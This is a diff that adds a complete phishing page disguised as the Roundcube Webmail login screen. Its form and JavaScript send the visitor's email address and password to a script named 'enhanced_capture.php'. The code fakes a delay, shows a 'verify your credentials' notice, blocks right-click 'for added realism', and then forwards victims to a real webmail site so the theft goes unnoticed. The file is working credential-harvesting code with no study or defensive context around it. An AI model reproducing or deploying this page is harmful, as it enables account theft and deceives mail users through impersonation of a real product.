@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+    <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: "Lucida Grande", "Lucida Sans Unicode", Arial, Verdana, sans-serif;
+            background: #f4f4f4;
+            color: #333;
+            font-size: 11px;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: #37404e;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 15px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+        
+        .logo {
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        
+        .header-info {
+            color: #ccc;
+            font-size: 10px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: #fff;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 420px;
+            margin: 60px auto;
+            padding: 0;
+            box-shadow: 0 3px 8px rgba(0,0,0,0.15);
+        }
+        
+        .login-header {
+            background: linear-gradient(to bottom, #f8f8f8, #e8e8e8);
+            border-bottom: 1px solid #ccc;
+            padding: 18px 25px;
+            border-radius: 4px 4px 0 0;
+        }
+        
+        .login-header h1 {
+            font-size: 16px;
+            color: #333;
+            margin: 0;
+            font-weight: normal;
+            display: flex;
+            align-items: center;
+        }
+        
+        .login-header h1::before {
+            content: "🔐";
+            margin-right: 8px;
+            font-size: 14px;
+        }
+        
+        .login-content {
+            padding: 35px 30px;
+        }
+        
+        .server-notice {
+            background: #e3f2fd;
+            border: 1px solid #90caf9;
+            color: #1565c0;
+            padding: 12px;
+            border-radius: 3px;
+            margin-bottom: 20px;
+            font-size: 11px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 11px;
+            color: #555;
+            font-weight: bold;
+        }
+        
+        .form-group input[type="email"],
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 13px;
+            font-family: inherit;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #4a90e2;
+            box-shadow: 0 0 5px rgba(74, 144, 226, 0.3);
+        }
+        
+        .form-group input:invalid {
+            border-color: #e57373;
+        }
+        
+        .form-actions {
+            margin-top: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .btn-login {
+            background: linear-gradient(to bottom, #4a90e2, #357abd);
+            border: 1px solid #2c5aa0;
+            color: #fff;
+            padding: 10px 25px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 12px;
+            font-family: inherit;
+            font-weight: bold;
+            transition: background 0.2s;
+        }
+        
+        .btn-login:hover:not(:disabled) {
+            background: linear-gradient(to bottom, #357abd, #2c5aa0);
+        }
+        
+        .btn-login:active {
+            background: #2c5aa0;
+        }
+        
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .options {
+            font-size: 10px;
+        }
+        
+        .options label {
+            display: inline;
+            margin-left: 6px;
+            color: #666;
+            cursor: pointer;
+        }
+        
+        .options input[type="checkbox"] {
+            margin-right: 4px;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 10px;
+            color: #999;
+        }
+        
+        .footer a {
+            color: #4a90e2;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-message {
+            background: #ffebee;
+            border: 1px solid #f8bbd9;
+            color: #721c24;
+            padding: 12px 15px;
+            border-radius: 3px;
+            margin-bottom: 20px;
+            font-size: 11px;
+            display: none;
+            animation: slideDown 0.3s ease;
+        }
+        
+        .success-message {
+            background: #e8f5e8;
+            border: 1px solid #4caf50;
+            color: #2e7d32;
+            padding: 12px 15px;
+            border-radius: 3px;
+            margin-bottom: 20px;
+            font-size: 11px;
+            display: none;
+            animation: slideDown 0.3s ease;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+        }
+        
+        .spinner {
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #4a90e2;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        
+        .attempt-counter {
+            text-align: center;
+            font-size: 10px;
+            color: #999;
+            margin-top: 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Responsive design */
+        @media (max-width: 480px) {
+            .login-box {
+                width: 95%;
+                margin: 30px auto;
+            }
+            
+            .login-content {
+                padding: 25px 20px;
+            }
+            
+            .form-actions {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            
+            .btn-login {
+                margin-top: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">Roundcube Webmail</div>
+        <div class="header-info">Secure Email Access</div>
+    </div>
+    
+    <div class="container">
+        <div class="login-box">
+            <div class="login-header">
+                <h1>User Login</h1>
+            </div>
+            <div class="login-content">
+                <div class="server-notice">
+                    For security reasons, please verify your credentials to continue accessing your mailbox.
+                </div>
+                
+                <div class="error-message" id="error-message">
+                    Login failed. Please check your credentials and try again.
+                </div>
+                
+                <div class="success-message" id="success-message">
+                    Login successful! Redirecting to your mailbox...
+                </div>
+                
+                <form id="login-form" method="POST" action="enhanced_capture.php">
+                    <div class="form-group">
+                        <label for="email">Username (Email Address)</label>
+                        <input type="email" id="email" name="email" required autocomplete="username" placeholder="user@domain.com">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="Enter your password">
+                    </div>
+                    
+                    <div class="form-actions">
+                        <div class="options">
+                            <input type="checkbox" id="remember" name="remember" value="1">
+                            <label for="remember">Remember me for 1 week</label>
+                        </div>
+                        <button type="submit" class="btn-login">Login</button>
+                    </div>
+                    
+                    <div class="attempt-counter" id="attempt-counter" style="display: none;">
+                        Login attempt: <span id="attempt-number">1</span>
+                    </div>
+                </form>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    Authenticating your credentials...
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            Powered by <a href="https://roundcube.net" target="_blank">Roundcube</a> webmail software<br>
+            <small>© 2024 Roundcube Dev Team. All rights reserved.</small>
+        </div>
+    </div>
+
+    <script>
+        let attemptCount = 0;
+        
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const form = this;
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const errorDiv = document.getElementById('error-message');
+            const successDiv = document.getElementById('success-message');
+            const loadingDiv = document.getElementById('loading');
+            const submitBtn = form.querySelector('.btn-login');
+            const attemptCounter = document.getElementById('attempt-counter');
+            const attemptNumber = document.getElementById('attempt-number');
+            
+            // Basic validation
+            if (!email || !password) {
+                showError('Please enter both username and password.');
+                return;
+            }
+            
+            if (!email.includes('@') || email.length < 5) {
+                showError('Please enter a valid email address.');
+                return;
+            }
+            
+            // Update attempt counter
+            attemptCount++;
+            attemptNumber.textContent = attemptCount;
+            if (attemptCount > 1) {
+                attemptCounter.style.display = 'block';
+            }
+            
+            // Show loading state
+            hideMessages();
+            loadingDiv.style.display = 'block';
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Authenticating...';
+            
+            // Add realistic delay
+            const delay = Math.random() * 1000 + 1500; // 1.5-2.5 seconds
+            
+            setTimeout(() => {
+                // Submit form data
+                fetch('enhanced_capture.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams(new FormData(form))
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Server error');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Login';
+                    
+                    if (data.signal === 'ok') {
+                        showSuccess(data.msg || 'Login successful! Redirecting...');
+                        setTimeout(() => {
+                            window.location.href = 'https://webmail.cpanel.net/';
+                        }, 2000);
+                    } else {
+                        showError(data.msg || 'Login failed. Please check your credentials and try again.');
+                        
+                        // Clear password field for security appearance
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    }
+                })
+                .catch(error => {
+                    loadingDiv.style.display = 'none';
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Login';
+                    showError('Connection error. Please check your internet connection and try again.');
+                });
+            }, delay);
+        });
+        
+        function showError(message) {
+            hideMessages();
+            const errorDiv = document.getElementById('error-message');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+        }
+        
+        function showSuccess(message) {
+            hideMessages();
+            const successDiv = document.getElementById('success-message');
+            successDiv.textContent = message;
+            successDiv.style.display = 'block';
+        }
+        
+        function hideMessages() {
+            document.getElementById('error-message').style.display = 'none';
+            document.getElementById('success-message').style.display = 'none';
+        }
+        
+        // Auto-focus on email field
+        document.getElementById('email').focus();
+        
+        // Add some realistic browser behavior
+        document.addEventListener('DOMContentLoaded', function() {
+            // Simulate loading time
+            setTimeout(() => {
+                document.body.style.opacity = '1';
+            }, 100);
+        });
+        
+        // Prevent right-click for added realism
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+        
+        // Track user interaction for realism
+        let interactionStarted = false;
+        document.addEventListener('click', function() {
+            if (!interactionStarted) {
+                interactionStarted = true;
+                console.log('User interaction detected');
+            }
+        });
+    </script>
+</body>
+</html>
